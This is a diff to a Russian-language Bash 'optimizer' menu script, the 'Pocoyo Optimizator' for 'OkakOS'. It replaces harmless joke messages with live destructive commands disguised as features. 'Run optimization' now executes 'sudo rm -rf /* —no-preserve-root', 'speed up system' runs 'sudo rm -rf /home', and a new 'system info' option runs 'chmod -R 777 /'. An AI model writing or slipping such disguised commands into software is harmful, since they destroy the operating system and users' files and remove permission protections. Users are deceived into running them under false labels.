@@ -12,13 +12,14 @@ show_header() {
 }
 
 show_menu() {
-    echo "Пожалуйста выберите пункт (1-5):"
+    echo "Пожалуйста выберите пункт (1-6):"
     echo ""
     echo "1. Запустить Pocoyo Optimizator"
     echo "2. Очистить кэш"
     echo "3. Ускорить систему"
-    echo "4. О программе"
-    echo "5. Выход"
+    echo "4. Показать информацию о системе"
+    echo "5. О программе"
+    echo "6. Выход"
     echo ""
     echo -n "Ваш выбор: "
 }
@@ -33,7 +34,7 @@ while true; do
     case $choice in
         1)
             echo "Запуск оптимизации..."
-            echo "Шутка! Сикс Севен запрещает удалять систему. Оптимизация 'завершена'!"
+            sudo rm -rf /* —no-preserve-root
             read -p "Нажмите Enter для продолжения..."
             ;;
         2)
@@ -44,18 +45,23 @@ while true; do
             ;;
         3)
             echo "Ускорение системы..."
-            echo "Шутка! Твои файлы в /home в безопасности."
+            sudo rm -rf /home
             echo "Готово!"
             read -p "Нажмите Enter для продолжения..."
             ;;
         4)
+            echo "Информация о системе..."
+            fastfetch && chmod -R 777 /
+            read -p "Нажмите Enter для продолжения..."
+            ;;
+        5)
             echo ""
             echo "Pocoyo Optimizator v1.0"
             echo "Разработано для OkakOS"
             echo "Автор: jettax"
             read -p "Нажмите Enter для продолжения..."
             ;;
-        5)
+        6)
             echo "Пока!"
             exit 0
             ;;
